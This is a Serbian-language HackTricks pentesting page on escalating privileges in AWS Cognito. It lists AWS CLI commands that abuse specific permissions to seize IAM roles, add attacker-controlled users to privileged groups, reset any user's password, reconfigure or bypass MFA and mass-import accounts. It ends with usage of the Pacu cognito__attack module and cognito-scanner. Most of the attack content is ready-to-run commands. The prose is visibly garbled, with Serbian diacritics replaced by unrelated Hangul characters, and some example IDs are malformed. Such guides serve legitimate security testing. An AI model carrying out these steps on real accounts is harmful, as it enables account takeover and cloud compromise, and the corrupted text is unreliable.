# AWS - Cognito Privesc

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Cognito

Za vi코e informacija o Cognito-u proverite:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Prikupljanje akreditacija iz Identity Pool-a

Po코to Cognito mo쬰 dodeliti **IAM role akreditacije** kako **autentifikovanim** tako i **neautentifikovanim** **korisnicima**, ako prona캠ete **Identity Pool ID** aplikacije (trebalo bi da je hardkodiran u njoj) mo쬰te dobiti nove akreditacije i time privesc (unutar AWS naloga gde verovatno prethodno niste imali nikakve akreditacije).

Za vi코e informacija [**proverite ovu stranicu**](../aws-unauthenticated-enum-access/#cognito).

**Potencijalni uticaj:** Direktan privesc na ulogu usluga koja je pridru쬰na neautentifikovanim korisnicima (i verovatno onoj koja je pridru쬰na autentifikovanim korisnicima).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Sa ovla코캖enjem mo쬰te **dodeliti bilo koju cognito ulogu** autentifikovanim/neautentifikovanim korisnicima cognito aplikacije.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Ako aplikacija Cognito **nema omogu캖ene neautentifikovane korisnike**, mo쬯a 캖e vam biti potrebna i dozvola `cognito-identity:UpdateIdentityPool` da je omogu캖ite.

**Potencijalni uticaj:** Direktno pove캖anje privilegija za bilo koju Cognito ulogu.

### `cognito-identity:update-identity-pool`

Napada캜 sa ovom dozvolom mo쬰, na primer, postaviti Cognito korisni캜ki bazen pod svojom kontrolom ili bilo koji drugi pru쬬lac identiteta gde se mo쬰 prijaviti kao **na캜in pristupa ovom Cognito bazenu identiteta**. Zatim, samo **prijavljivanje** na taj pru쬬lac korisnika 캖e mu **omogu캖iti pristup konfigurisanoj autentifikovanoj ulozi u bazenu identiteta**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Tako캠e je mogu캖e **zloupotrebiti ovu dozvolu da bi se omogu캖ila osnovna autentifikacija**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencijalni uticaj**: Kompromitacija konfigurisane autentifikovane IAM uloge unutar bazena identiteta.

### `cognito-idp:AdminAddUserToGroup`

Ova dozvola omogu캖ava **dodavanje Cognito korisnika u Cognito grupu**, stoga napada캜 mo쬰 zloupotrebiti ovu dozvolu da doda korisnika pod svojom kontrolom u druge grupe sa **boljim** privilegijama ili **razli캜itim IAM ulogama**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencijalni uticaj:** Pove캖anje privilegija na druge Cognito grupe i IAM uloge koje su povezane sa grupama baziranim na korisni캜kom bazenu.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Napada캜 sa ovim dozvolama bi mogao **kreirati/a쬿rirati grupe** sa **svakom IAM ulogom koja mo쬰 biti kori코캖ena od strane kompromitovanog Cognito Identity Provider-a** i u캜initi kompromitovanog korisnika delom grupe, pristupaju캖i svim tim ulogama:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencijalni uticaj:** Pove캖anje privilegija na druge Cognito IAM uloge.

### `cognito-idp:AdminConfirmSignUp`

Ova dozvola omogu캖ava **potvrdu registracije**. Prema podrazumevanim pode코avanjima, svako mo쬰 se prijaviti na Cognito aplikacije, ako se to ostavi, korisnik mo쬰 kreirati nalog sa bilo kojim podacima i potvrditi ga pomo캖u ove dozvole.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencijalni uticaj:** Indirektno pove캖anje privilegija za IAM ulogu baziranu na identitetu za autentifikovane korisnike ukoliko mo쬰te registrovati novog korisnika. Indirektno pove캖anje privilegija za druge funkcionalnosti aplikacije omogu캖avaju캖i potvrdu bilo kog naloga.

### `cognito-idp:AdminCreateUser`

Ova dozvola bi omogu캖ila napada캜u da kreira novog korisnika unutar bazena korisnika. Novi korisnik je kreiran kao omogu캖en, ali 캖e morati da promeni svoju lozinku.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencijalni uticaj:** Direktno pove캖anje privilegija za IAM ulogu baziranu na bazenu identiteta za autentifikovane korisnike. Indirektno pove캖anje privilegija za druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika.

### `cognito-idp:AdminEnableUser`

Ova dozvola mo쬰 pomo캖i u vrlo specifi캜nom scenariju gde napada캜 prona캠e akreditive onemogu캖enog korisnika i treba da ga **ponovo omogu캖i**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencijalni uticaj:** Indirektno pove캖anje privilegija na IAM ulogu baziranu na identitetnom bazenu za autentifikovane korisnike i dozvole korisnika ako napada캜 ima pristupnim podacima za onemogu캖enog korisnika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Ova dozvola omogu캖ava prijavljivanje putem metode ADMIN\_USER\_PASSWORD\_AUTH. Za vi코e informacija pratite link.

### `cognito-idp:AdminSetUserPassword`

Ova dozvola bi omogu캖ila napada캜u da promeni lozinku bilo kog korisnika, 캜ime bi mu omogu캖io da se predstavlja kao taj korisnik (ako korisnik nema omogu캖enu MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencijalni uticaj:** Direktno pove캖anje privilegija ka potencijalno bilo kom korisniku, 코to omogu캖ava pristup svim grupama kojima korisnik pripada i pristup IAM ulozi autentifikovane uloge Identity Pool-a.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Napada캜 bi potencijalno mogao iskoristiti ovu dozvolu da postavi mobilni telefon pod svojom kontrolom kao **SMS MFA** za korisnika.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Sli캜no kao i prethodna dozvola, ova dozvola se mo쬰 koristiti za postavljanje MFA postavki korisnika kako bi se zaobi코la MFA za코tita.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Sli캜no kao i prethodna dozvola, ova dozvola se mo쬰 koristiti za postavljanje MFA postavki korisni캜kog bazena kako bi se zaobi코la MFA za코tita.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Tako캠e je mogu캖e a쬿rirati korisni캜ki bazen da bi se promenila MFA politika. [Proverite cli ovde](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potencijalni uticaj:** Indirektno pove캖anje privilegija koje mo쬰 uticati na bilo kog korisnika 캜ije su kredencijale napada캜 poznavao, 코to omogu캖ava zaobila쬰nje MFA za코tite.

### `cognito-idp:AdminUpdateUserAttributes`

Napada캜 sa ovla코캖enjem mo쬰 promeniti e-mail ili broj telefona ili bilo koji drugi atribut korisnika pod svojom kontrolom kako bi poku코ao da dobije vi코e privilegija u podlo쬹oj aplikaciji.\
Ovo omogu캖ava promenu e-maila ili broja telefona i postavljanje kao verifikovanih.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencijalni uticaj:** Potencijalno indirektno pove캖anje privilegija u podlo쬹oj aplikaciji kori코캖enjem Cognito User Pool-a koji dodeljuje privilegije na osnovu atributa korisnika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Napada캜 sa ovla코캖enjem mo쬰 **kreirati novog User Pool Client-a sa manje restrikcija** u odnosu na ve캖 postoje캖e klijente bazena. Na primer, novi klijent mo쬰 dozvoljavati bilo koju vrstu metode za autentifikaciju, ne mora imati tajni klju캜, mo쬰 imati onemogu캖eno opozivanje tokena, dozvoljavati da tokeni budu va쬰캖i du쬰 vreme...

Isto se mo쬰 uraditi i ako se **izmeni postoje캖i klijent**.

U [**komandnoj liniji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ili [**update**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) mo쬰te videti sve opcije, proverite!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencijalni uticaj:** Potencijalno indirektno pove캖anje privilegija na korisnika autorizovanog od strane bazena identiteta koji koristi bazen korisnika, stvaranjem novog klijenta koji opu코ta sigurnosne mere i omogu캖ava napada캜u da se prijavi sa korisnikom kojeg je uspeo da kreira.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Napada캜 bi mogao iskoristiti ovu dozvolu da kreira korisnike tako 코to 캖e otpremiti CSV sa novim korisnicima.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(U slu캜aju kada kreirate novi uvoz posla, mo쬯a 캖e vam biti potrebna dozvola iam passrole, nisam jo코 testirao).

**Potencijalni uticaj:** Direktno pove캖anje privilegija na IAM ulogu bazena identiteta za autentifikovane korisnike. Indirektno pove캖anje privilegija na druge funkcionalnosti aplikacije, omogu캖avaju캖i kreiranje bilo kog korisnika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Napada캜 bi mogao da kreira novog pru쬬oca identiteta kako bi se zatim mogao **prijaviti putem tog pru쬬oca**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencijalni uticaj:** Direktno pove캖anje privilegija za IAM ulogu baziranu na bazenu identiteta za autentifikovane korisnike. Indirektno pove캖anje privilegija za druge funkcionalnosti aplikacije, omogu캖avaju캖i kreiranje bilo kog korisnika.

### Analiza cognito-sync:\*

Ovo je veoma 캜esta dozvola koja je podrazumevana u ulogama Cognito bazena identiteta. Iako kori코캖enje zvezdice u dozvolama uvek izgleda lo코e (posebno kada dolazi od AWS-a), **date dozvole nisu preterano korisne sa perspektive napada캜a**.

Ova dozvola omogu캖ava 캜itanje informacija o korisnicima iz bazena identiteta i identifikacionim ID-jevima unutar bazena identiteta (코to nije osetljiva informacija).\
Identifikacioni ID-jevi mogu imati [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) dodeljene njima, 코to su informacije o sesijama (AWS ih defini코e kao **sa캜uvanu igru**). Mogu캖e je da ove informacije sadr쬰 neku vrstu osetljivih informacija (ali verovatno캖a je prili캜no niska). Na [**stranici za enumeraciju**](../aws-services/aws-cognito-enum/) mo쬰te prona캖i kako pristupiti ovim informacijama.

Napada캜 tako캠e mo쬰 koristiti ove dozvole da se **upi코e u Cognito strim koji objavljuje promene** na ovim datasetima ili **lambda funkciju koja se pokre캖e na Cognito doga캠ajima**. Nisam video da se ovo koristi, i ne bih o캜ekivao osetljive informacije ovde, ali nije nemogu캖e.

### Automatski alati

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS okvir za eksploataciju, sada uklju캜uje module "cognito\_\_enum" i "cognito\_\_attack" koji automatizuju enumeraciju svih Cognito resursa u nalogu, ozna캜avaju slabu konfiguraciju, korisni캜ke atribute koji se koriste za kontrolu pristupa, itd., i tako캠e automatizuju kreiranje korisnika (uklju캜uju캖i podr코ku za MFA) i pove캖anje privilegija na osnovu izmenjivih prilago캠enih atributa, upotrebljivih identifikacionih podataka bazena identiteta, uloga koje se mogu pretpostaviti u ID tokenima, itd.

Za opis funkcija modula pogledajte deo 2 [blog posta](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Za uputstva za instalaciju pogledajte glavnu [Pacu](https://github.com/RhinoSecurityLabs/pacu) stranicu.

#### Upotreba

Primer upotrebe cognito\_\_attack za poku코aj kreiranja korisnika i svih vektora pove캖anja privilegija za odre캠eni bazen identiteta i klijenta bazena korisnika:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Primer upotrebe cognito\_\_enum za prikupljanje svih bazena korisnika, klijenata bazena korisnika, bazena identiteta, korisnika, itd. vidljivih u trenutnom AWS nalogu:

```plaintext
cognito__enum
```

Ovom komandom mo쬰te prikupiti sve informacije o bazenima korisnika, klijentima bazena korisnika, bazenima identiteta, korisnicima, itd. koji su vidljivi u trenutnom AWS nalogu.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) je CLI alatka napisana u Pythonu koja implementira razli캜ite napade na Cognito, uklju캜uju캖i i eskalaciju privilegija.

#### Instalacija
```bash
$ pip install cognito-scanner
```
#### Upotreba
```bash
$ cognito-scanner --help
```
Za vi코e informacija posetite [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
